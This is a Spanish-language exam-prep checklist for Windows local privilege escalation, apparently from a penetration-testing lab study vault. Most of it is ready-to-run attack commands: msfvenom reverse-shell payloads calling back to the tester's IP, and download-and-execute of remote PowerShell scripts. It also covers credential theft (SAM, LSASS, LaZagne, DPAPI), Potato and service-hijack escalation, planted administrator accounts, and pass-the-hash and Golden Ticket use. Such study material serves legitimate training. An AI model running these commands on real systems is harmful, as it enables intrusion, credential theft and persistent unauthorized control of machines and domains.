# LPE Windows — enumeración y escalada paso a paso

Checklist de escalada en Windows. **Recorré en este orden, sin saltear bloques.**

Esta nota es el **paso a paso con comandos**. La referencia profunda de cada vector está en
[`04-privesc-windows.md`](../04-privesc-windows.md) y en las chuletas
([`potatoes.md`](../../cheatsheets/potatoes.md), [`mssql-injection.md`](../../cheatsheets/mssql-injection.md)).

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]]

---

## 0. Antes de empezar

### 0.1 Shell decente

Una shell de `cmd` en reverse es inestable y te limita. Si podés:

```powershell
powershell -ep bypass
```

Con credenciales y el 5985 abierto, `evil-winrm` es muy superior:

```bash
evil-winrm -i <IP> -u '<USER>' -p '<PASS>'
evil-winrm -i <IP> -u '<USER>' -H <NTHASH>          # pass-the-hash
```

> Si tu único acceso es una **webshell**, no alcanza para los flags: necesitás shell
> interactiva. Ver [[00-reglas-examen]].

### 0.2 Herramientas

Subí una (o varias) vía `evil-winrm -e` o un servidor HTTP:

| Herramienta | Para qué |
| --- | --- |
| `winPEASx64.exe` | Enumeración automática — **corrélo primero y leé lo rojo/amarillo** |
| `PowerUp.ps1` | Servicios, tareas, autoruns, AlwaysInstallElevated |
| `PrivescCheck.ps1` | Alternativa más silenciosa |
| `Seatbelt.exe` / `SharpUp.exe` | Enumeración del host / de escalada |
| `accesschk.exe` | Permisos de servicios, archivos y claves de registro |
| `GodPotato.exe`, `PrintSpoofer64.exe` | SeImpersonate → SYSTEM |
| `potato_check64.exe` | **Dice qué Potato aplica** según build/servicios/privilegios |
| `FullPowers.exe` | Recuperar privilegios tras un token restringido |
| `procdump64.exe` | Volcado de LSASS |
| `winPEAS.bat` | Fallback sin PowerShell |

Están en `~/examen/tools/win/`. Para servirlos:

```bash
cd ~/examen/tools/win && python3 -m http.server 8000
```

> **PowerUp — CONFIRMADO**: usalo **solo para enumerar/chequear** (`Invoke-AllChecks`,
> `Get-ModifiableService`, `Get-ModifiableScheduledTaskFile`…). **NO uses sus funciones de abuso**
> (`Invoke-ServiceAbuse`, `Write-UserAddMSI`, …): la explotación la hacés **a mano**. PowerUp **no
> es una herramienta de abuso**.

### 0.3 Regla de oro

**Marcá cada hallazgo, pero no te confíes de la herramienta.** winPEAS sugiere, vos decidís.
Y recordá: **no hay escalada sin enumeración previa.**

---

## 1. Enumeración inicial — el bloque que no se saltea

### 1.1 Identidad y sistema

```cmd
whoami /all
hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
wmic qfe get Captcha,HotFixID,InstalledOn
net user
net localgroup
net localgroup administrators
```

```powershell
[System.Environment]::OSVersion
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsHardwareAbstractionLayer
```

### 1.2 Privilegios — `whoami /priv` (lo más rentable)

```cmd
whoami /priv
```

> Ojo: muchos privilegios aparecen **Disabled**. Si están presentes en el token, **tu propio
> proceso puede habilitarlos** al usarlos (muchas herramientas lo hacen solas).

| Privilegio presente | Vía de escalada |
| --- | --- |
| `SeImpersonatePrivilege` | **Potato → SYSTEM** (vector #1 si el foothold fue web/MSSQL) |
| `SeAssignPrimaryTokenPrivilege` | Potato → SYSTEM |
| `SeBackupPrivilege` | `SeBackupPrivilege`/`SeRestorePrivilege` → leer SAM/SYSTEM; NTDS.dit en un DC |
| `SeRestorePrivilege` | restaurar/reemplazar archivos protegidos |
| `SeTakeOwnershipPrivilege` | tomar propiedad de cualquier archivo → `Utilman.exe` |
| `SeDebugPrivilege` | inyectar en cualquier proceso → dump de LSASS |
| `SeLoadDriverPrivilege` | cargar driver vulnerable (`Capcom.sys`) → SYSTEM |
| `SeManageVolumePrivilege` | `SeManageVolumeExploit.exe` → escribir en `C:\` |
| `SeCreateTokenPrivilege` | crear un token con SIDs arbitrarios (raro) |
| `SeTcbPrivilege` | "act as part of the OS" (raro) |
| `SeSecurityPrivilege` | manipular descriptores de seguridad / auditoría |
| `SeRelabelPrivilege` | cambiar etiquetas de integridad (bypass de restricciones) |
| `SeImpersonate` / `SeAssignPrimaryToken` | **empezá acá** |

Detalle y binarios: [`../cheatsheets/potatoes.md`](../../cheatsheets/potatoes.md) y
[`04-privesc-windows.md`](../04-privesc-windows.md) §1.

### 1.3 Grupos

```cmd
whoami /groups
net localgroup
```

Grupos locales peligrosos: **Administrators**, **Backup Operators**, **Server Operators**,
**Account Operators**, **Print Operators**, **Hyper-V Administrators**, **Remote Management
Users** (→ WinRM).

> `whoami /groups` marca el **nivel de integridad**: si sos `Administrators` pero con
> `Medium Mandatory Level`, tenés el token **filtrado por UAC** (ver §3.7).

### 1.4 Defensas y protecciones

```powershell
# Defender / antivirus
Get-MpComputerStatus
sc query windefend

# AppLocker
Get-AppLockerPolicy -Effective

# LAPS (si el admin local está gestionado)
Get-ChildItem 'C:\Program Files\LAPS' -Recurse -EA SilentlyContinue
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /s 2>nul
```

También: WDAC, Constrained Language Mode (`$ExecutionContext.SessionState.LanguageMode`),
AMSI (ver §3.9).

### 1.5 Procesos, servicios y tareas — **el bloque que suele faltar**

#### 1.5.1 Procesos

```cmd
tasklist /v /fo list
wmic process get name,processid,executablepath,commandline
```

```powershell
Get-CimInstance Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine | fl
Get-Process | Where-Object {$_.Path} | Select-Object Name,Id,Path
Get-Process -IncludeUserName                       # requiere admin
```

**Qué buscar:**

- Procesos que corren como **SYSTEM / Administrador** desde un **directorio que podés escribir**.
- **Command lines con credenciales** (`-p`, `-pass`, `/user:`, connection strings).
- Procesos de servicios (IIS `w3wp`, MSSQL `sqlservr`, `tomcat`) → suelen tener
  `SeImpersonatePrivilege`.
- **DLLs cargadas** desde rutas escribibles (DLL hijacking):

```powershell
Get-Process <nombre> | Select-Object -ExpandProperty Modules | Select-Object FileName
# o con Sysinternals:
.\listdlls.exe -accepteula <PID>
```

- Pipes con permisos débiles: `pip` se ve con **PipeList** / `accesschk.exe -w \pipe\*` (raro).

#### 1.5.2 Servicios

```cmd
sc query state= all
sc qc <servicio>
wmic service get name,displayname,pathname,startmode,startname
```

```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName,StartMode | fl
```

**Qué buscar:**

| Vector | Cómo detectarlo |
| --- | --- |
| **Ruta sin comillas** (unquoted service path) | `wmic service get name,pathname \| findstr /i /v "\""` |
| **Binario del servicio escribible** | `icacls "C:\ruta\servicio.exe"` → `(F)`/`(M)` para tu user |
| **Config del servicio modificable** | `accesschk.exe -uwcqv "Users" *` → `SERVICE_CHANGE_CONFIG` |
| **DLL de servicio secuestrable** | ruta de la DLL no existe y el directorio es escribible |
| **Permisos de registro del servicio** | `accesschk.exe -uvwqk HKLM\SYSTEM\CurrentControlSet\Services` |

> Si podés cambiar el `binpath` de un servicio que corre como SYSTEM:
> `sc config <svc> binpath= "C:\Temp\shell.exe"` + `sc stop/start`.

Receta completa: [[unquoted-service-path]] y [`04-privesc-windows.md`](../04-privesc-windows.md) §2.

#### 1.5.3 Tareas programadas (schtasks)

> **El atajo que buscás**: filtrar todas las de Microsoft para quedarte con lo revisable.

```powershell
# Quitar TODO lo de Microsoft (HackTricks)
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} |
  Format-Table TaskName,TaskPath,State

# Ver binario/script, argumentos y con qué cuenta corre, sin las de Microsoft
Get-ScheduledTask | ForEach-Object {
  [pscustomobject]@{
    TaskName = $_.TaskName
    TaskPath = $_.TaskPath
    RunAs    = $_.Principal.UserId
    State    = $_.State
    Exec     = ($_.Actions | ForEach-Object Execute) -join '; '
    Args     = ($_.Actions | ForEach-Object Arguments) -join '; '
  }
} | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-Table -AutoSize

# Solo las que corren como SYSTEM
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match 'SYSTEM'} |
  Select-Object TaskName,TaskPath,State,@{n='Exec';e={$_.Actions.Execute}}
```

```cmd
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt & findstr /i "SYSTEM" schtasks.txt
schtasks /query /tn "<TASK_PATH>" /xml
```

```powershell
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Format-List TaskName,TaskPath,State
(Get-ScheduledTask -TaskName '<TASK>').Actions
```

> **Truco**: si sos Administrador local, creá una tarea que corra como SYSTEM y te añada al
grupo de administradores:
>
> ```cmd
> schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators <USER> /add"
> schtasks /run /tn "SchedPE"
> ```
> (equivalente PowerShell en §3.3).

**Qué buscar:**

- Una tarea que corre como **SYSTEM/Administrador** y ejecuta un **script o binario que vos
  podés editar** → lo reemplazás y esperás el disparo.
- Tareas **ocultas** (no aparecen en el Task Scheduler; viven en el registro).
- Tareas con rutas relativas o desde directorios escribibles.
- `schtasks /change` si podés modificar la tarea.

```powershell
# PowerUp lo detecta automáticamente
. .\PowerUp.ps1
Get-ModifiableScheduledTaskFile
```

> **Buscá contraseñas dentro de las tareas.** Los argumentos (`/TR`) y las acciones suelen llevar
> credenciales en claro. Volcá todo y grepeá:
>
> ```cmd
> schtasks /query /fo LIST /v > C:\Temp\tasks.txt
> findstr /i "password passwd pwd /p: /pass /user:" C:\Temp\tasks.txt
> ```
> También en XML: `schtasks /query /xml ONE > C:\Temp\alltasks.xml & findstr /i pass C:\Temp\alltasks.xml`

#### 1.5.4 Autoruns / registro

```cmd
:: WMIC / CIM startup
wmic startup get caption,command
:: Run / RunOnce (incluye la vista 32-bit Wow6432Node)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
:: RunServices y RunOnceEx
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx /s
:: Winlogon: Userinit y Shell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
:: Policy Run y UserInitMprLogonScript
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v Run
reg query "HKCU\Environment" /v UserInitMprLogonScript
:: Active Setup (corre ANTES que Run/RunOnce)
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
:: IFEO (debugger hijack)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s
```

```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | fl

# Carpetas de Inicio (Startup)
Get-ChildItem "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Localización de la carpeta Startup (por si fue movida)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
```

**Qué buscar**: una entrada que apunte a un ejecutable **escribible** (o un `StubPath`/`Userinit`
modificable). Lo reemplazás y esperás el arranque/login. Referencia:
[HackTricks — Autoruns](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html).

### 1.6 Credenciales almacenadas

```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   :: DefaultPassword
dir /s /b C:\ 2>nul | findstr /i "unattend.xml sysprep.xml sysprep.inf unattend.txt"
findstr /S /I cpassword \\<DC>\sysvol\<dominio>\Policies\*.xml
```

```powershell
# Historial de PowerShell (TODOS los usuarios)
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# y el del usuario actual:
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Configs con credenciales
Get-ChildItem -Path C:\ -Include web.config,*.config,*.xml,*.ini,*.env -Recurse -EA SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd|connectionString" -EA SilentlyContinue

# PuTTY
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# WiFi
netsh wlan show profile
netsh wlan show profile name="<SSID>" key=clear
```

Bóveda / `runas /savecred`:

```cmd
runas /savecred /user:Administrator "cmd /c whoami"
```

DPAPI (mimikatz / Seatbelt):

```cmd
mimikatz.exe "dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID>" "exit"
Seatbelt.exe -group=chromium,user
```

### LaZagne (credenciales locales de aplicaciones)

```cmd
LaZagne.exe all
LaZagne.exe browsers -oN C:\Temp\laz.txt
LaZagne.exe windows
```

Saca credenciales de **navegadores, clientes de correo, WiFi, bases de datos, git, chats** y de
la propia Windows (Credential Manager). Es de los que más rinde en un host ya comprometido.

### 1.7 Sistema de archivos

```cmd
:: Directorios escribibles por tu usuario
accesschk.exe -uwdqs "Users" C:\
accesschk.exe -uwqs "Users" C:\*.*

:: Archivos interesantes
dir /s /b C:\ 2>nul | findstr /i "pass backup .kdbx id_rsa .ovpn .rdp"
```

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
  Where-Object {$_.Attributes -match 'ReadOnly','Hidden'} | Select-Object FullName
```

### 1.8 Software y parches (exploits conocidos)

```cmd
wmic product get name,version
```

```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName,DisplayVersion,Publisher
```

```bash
# En tu Kali, sugeridor de exploits
windows-exploit-suggester.py --database 2023-*.xls --systeminfo systeminfo.txt
# o wesng
```

CVEs que siguen apareciendo: **PrintNightmare** (CVE-2021-34527), **Zerologon**
(CVE-2020-1472), **MS16-032**, **BlueKeep** (CVE-2019-0708), **CVE-2024-26229**,
**CVE-2019-1388** (UAC).

> Los exploits de kernel van **último**: pueden tumbar la máquina y quemar un revert.

### 1.9 Red

```cmd
ipconfig /all
route print
arp -a
netstat -ano
net share
```

**Qué buscar**: subredes internas (pivoting), puertos locales, shares, sesiones.

---

## 2. Orden de ataque — checklist rápido

```text
[ ] 0.  Shell decente (PowerShell / WinRM)
[ ] 1.  whoami /all + whoami /priv + whoami /groups     ← define todo
[ ] 1b. winPEAS / PowerUp / Seatbelt                    ← automático, para orientar
[ ] 1c. potato_check64.exe                              ← dice qué Potato aplica
[ ] 2.  SeImpersonate / SeAssignPrimaryToken            → Potato → SYSTEM
[ ] 3.  Procesos: SYSTEM desde dir escribible / creds en cmdline
[ ] 4.  Servicios: rutas sin comillas, binarios/config escribibles
[ ] 5.  Tareas programadas (schtasks): script escribible que corre como SYSTEM
[ ] 6.  Autoruns / Run / Winlogon
[ ] 7.  Credenciales: cmdkey, unattend, GPP, web.config, WiFi, historial
[ ] 8.  AlwaysInstallElevated (las DOS claves en 1)
[ ] 9.  SeBackupPrivilege → SAM/SYSTEM · SeDebug → LSASS · SeManageVolume
[ ] 10. Dump SAM/LSA (si ya sos admin local)
[ ] 11. UAC bypass (solo si YA sos Administrador local)
[ ] 12. Kernel / CVEs                                    ← ÚLTIMO
```

---

## 3. Explotación por vector (comandos)

### 3.1 Potato (SeImpersonate / SeAssignPrimaryToken)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators <USER> /add"

PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "cmd /c net localgroup administrators <USER> /add"
```

Si falla, la tabla de compatibilidad y alternativas (Rogue/Juicy/Sweet/Generic) está en
[`../cheatsheets/potatoes.md`](../../cheatsheets/potatoes.md).

> **Primero corré `potato_check64.exe`** en la víctima: te dice qué variante aplica según el
> build, si el **Spooler/DCOM/EFS** están activos y si tenés el privilegio. La tabla de
> compatibilidad build → variante y el blog de cada Potato están en la chuleta.

### 3.2 Servicios

```cmd
:: Ruta sin comillas: plantar el binario intermedio
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o Program.exe
sc stop <svc> & sc start <svc>

:: Binario escribible: reemplazar y reiniciar
copy /y C:\Temp\payload.exe "C:\ruta\servicio.exe"
sc stop <svc> & sc start <svc>

:: Config modificable (SERVICE_CHANGE_CONFIG)
sc config <svc> binpath= "C:\Temp\shell.exe"
sc stop <svc> & sc start <svc>
```

### 3.3 Tareas programadas

```cmd
:: Ver la acción y reemplazar el script/binario escribible
schtasks /query /tn "<TASK>" /xml
echo C:\Temp\shell.exe > "C:\ruta\script_escribible.bat"
:: Y esperar el trigger (o forzarlo si podés):
schtasks /run /tn "<TASK>"

:: Si sos Administrador local: crear una tarea como SYSTEM que te añada a admins
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators <USER> /add"
schtasks /run /tn "SchedPE"
```

```powershell
# Equivalente en PowerShell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net localgroup administrators <USER> /add"
$P = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "SchedPE" -Action $A -Principal $P -Trigger (New-ScheduledTaskTrigger -AtLogOn)
Start-ScheduledTask -TaskName "SchedPE"
```

### 3.4 AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# En Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Temp\evil.msi
```

### 3.5 Credenciales

```cmd
:: Credenciales guardadas
cmdkey /list
runas /savecred /user:Administrator "cmd /c whoami"

:: GPP cpassword
gpp-decrypt <CPASSWORD>
nxc smb <DC> -u user -p pass -M gpp_password
```

### 3.6 SeBackupPrivilege → SAM/SYSTEM (o NTDS.dit en DC)

```cmd
robocopy /b C:\Windows\System32\config\SAM    C:\Temp\ SAM
robocopy /b C:\Windows\System32\config\SYSTEM C:\Temp\ SYSTEM
```

```bash
# En Kali
secretsdump.py -sam SAM -system SYSTEM LOCAL
nxc smb <DC> -u user -p pass --ntds            # si es DC y sos admin
```

### 3.7 UAC bypass (solo si ya sos Administrador local)

```cmd
whoami /groups      :: Administrators + "Medium Mandatory Level" = token filtrado
```

Auto-elevan sin prompt: **`fodhelper.exe`**, `computerdefaults.exe`, `sdclt.exe`,
`eventvwr.exe`. Módulo UACME disponible en `~/examen/tools/win/`.

### 3.8 Kernel / CVEs

```cmd
systeminfo
wmic qfe get Captcha,HotFixID,InstalledOn
```

Elegí el exploit **para esa versión exacta**. Prudencia con el riesgo de crashear.

### 3.9 Si PowerShell falla (AMSI)

```powershell
# Test: si falla en silencio, AMSI te bloqueó
IEX (New-Object Net.WebClient).DownloadString('http://<TU_IP>:8000/PowerUp.ps1')
```

Alternativas: `-enc`, ofuscación, o usar el `.exe` en vez del `.ps1`.

---

## 4. Post-explotación: crear / añadir un administrador

> Objetivo típico: **asegurar el acceso** creando tu propio admin, o meterte en
> `Administrators` / `Domain Admins`. Sirve tanto para local como para dominio.
> Verificá siempre la identidad con `whoami` antes y después.

### 4.1 Administrador LOCAL

```cmd
:: Crear usuario y añadirlo a Administrators
net user hacker P@ssw0rd123! /add
net localgroup administrators hacker /add

:: Solo añadir un usuario existente
net localgroup administrators <USER> /add

:: Verificar e iniciar sesión
net localgroup administrators
net user hacker
```

```powershell
$pass = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
New-LocalUser -Name 'hacker' -Password $pass -PasswordNeverExpires
Add-LocalGroupMember -Group 'Administrators' -Member 'hacker'
```

En remoto (tenés admin local en la máquina) desde tu Kali:

```bash
# Con credenciales
/usr/bin/nxc smb <IP> -u Administrator -p '<PASS>' -x 'net localgroup administrators hacker /add'
# Con pass-the-hash
/usr/bin/nxc smb <IP> -u Administrator -H <NTHASH> -x 'net localgroup administrators hacker /add'
# Con WinRM
/usr/bin/nxc winrm <IP> -u Administrator -p '<PASS>' -x 'net localgroup administrators hacker /add'
# Con WinRM interactivo (dentro de la shell, ejecutá el comando):
evil-winrm -i <IP> -u Administrator -H <NTHASH>
#   *Evil-WinRM* PS> net localgroup administrators hacker /add
```

### 4.2 Administrador de DOMINIO

Requiere **Domain Admin / privilegios delegados** en el dominio.

```cmd
net user hacker P@ssw0rd123! /add /domain
net group "Domain Admins" hacker /add /domain
net group "Enterprise Admins" hacker /add /domain     :: solo si tenés ese control
```

```powershell
# PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'hacker' -Verbose

# Módulo de AD
Add-ADGroupMember -Identity "Domain Admins" -Members "hacker"
```

Desde Kali con credenciales de DA:

```bash
/usr/bin/nxc smb <DC> -u Administrator -p '<PASS>' -x 'net group "Domain Admins" hacker /add /domain'
# Pass-the-Hash
/usr/bin/nxc smb <DC> -u Administrator -H <NTHASH> -x 'net group "Domain Admins" hacker /add /domain'
```

> Alternativa "de manual": creás el usuario y le das `WriteDacl`/`GenericAll` para agregarse
> uno mismo ([[addmember]], [[genericall]], [[writedacl]]).

### 4.3 Con un **ticket Kerberos** (Pass-the-Ticket)

**En Linux** (Impacket/NetExec):

```bash
# 1) Tenés el .ccache (de getTGT, getST, certipy auth, Rubeus ticketConverter, etc.)
export KRB5CCNAME=/ruta/administrator.ccache

# 2) Usalo contra el host (sin contraseña)
impacket-psexec -k -no-pass <host>.<dominio>
impacket-wmiexec -k -no-pass <host>.<dominio>
/usr/bin/nxc smb <host>.<dominio> -k --use-kcache -x 'whoami'

# 3) Añadirte como admin (local o de dominio)
/usr/bin/nxc smb <DC> -k --use-kcache -x 'net group "Domain Admins" hacker /add /domain'
/usr/bin/nxc smb <host> -k --use-kcache -x 'net localgroup administrators hacker /add'
```

**En Windows** (Rubeus):

```cmd
:: Importar el ticket (base64)
Rubeus.exe ptt /ticket:<BASE64>
klist

:: Lanzar un proceso con las credenciales de red del ticket
Rubeus.exe createnetonly /program:cmd.exe
:: o
Rubeus.exe asktgt /user:<USER> /password:<PASS> /ptt /domain:<DOM>
```

Con el ticket importado, usá `runas /netonly` o `Enter-PSSession`, o directamente:

```cmd
net group "Domain Admins" hacker /add /domain
```

**evil-winrm con ccache** (desde Kali, sin contraseña):

```bash
evil-winrm -i <dc>.<dominio> -u Administrator -K administrator.ccache -r <dominio.local>
```

### 4.4 Con un **hash NTLM** (Pass-the-Hash)

```bash
evil-winrm -i <IP> -u Administrator -H <NTHASH>
impacket-psexec -hashes :<NTHASH> Administrator@<IP>
/usr/bin/nxc smb <IP> -u Administrator -H <NTHASH> -x 'net localgroup administrators hacker /add'
```

### 4.5 Con un **Golden Ticket** (hash del `krbtgt`)

```bash
# 1) Forjar el ticket
impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain <dominio.local> Administrator

# 2) Usarlo
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DC>.<dominio>

# 3) Desde ahí, agregar admin de dominio
net group "Domain Admins" hacker /add /domain
```

> **Peligro**: nunca cambies la contraseña del `krbtgt` (dos cambios rompen el dominio).

### 4.6 Verificación

```cmd
whoami
whoami /groups
net localgroup administrators
net group "Domain Admins" /domain
```

---

## 5. Errores que cuestan tiempo

| Error | Por qué duele |
| --- | --- |
| No correr `whoami /priv` primero | Es gratis y es la vía más probable |
| Enumerar solo servicios y olvidar **procesos y tareas programadas** | Es donde vive la escalada en muchos labs |
| Insistir con el Potato equivocado | GodPotato cubre casi todo; PrintSpoofer falla en Server Core |
| Ir directo al kernel exploit | Puede tumbar la máquina y quemar un revert |
| Confundir UAC con escalada | UAC solo sirve si ya sos Administrador local |
| Leer el flag desde una webshell | **Cero puntos** en esa máquina |
| Crear usuario admin y no documentarlo | El reporte es final; ver [[08-reporte-y-evidencia]] |

---

## 6. Herramientas y referencias

| Recurso | Para qué |
| --- | --- |
| [[seimpersonate]] · [[unquoted-service-path]] · [[lsass]] · [[alwaysinstallelevated]] | Recetas del vault |
| [`04-privesc-windows.md`](../04-privesc-windows.md) | Referencia profunda por técnica |
| [`../cheatsheets/potatoes.md`](../../cheatsheets/potatoes.md) | Familia Potato + compatibilidad |
| [[LOLBAS]] | 248 binarios de Windows usables como atacante (descarga/ejecución/persistencia) |
| [[WADComs]] | Recetas de AD ordenadas por lo que tenés (usuario, hash, TGT…) |
| [HackTricks — Windows LPE](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) | Listado exhaustivo de vectores |
| [Windows Privilege Escalation Checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md) | Checklist para no saltear pasos |
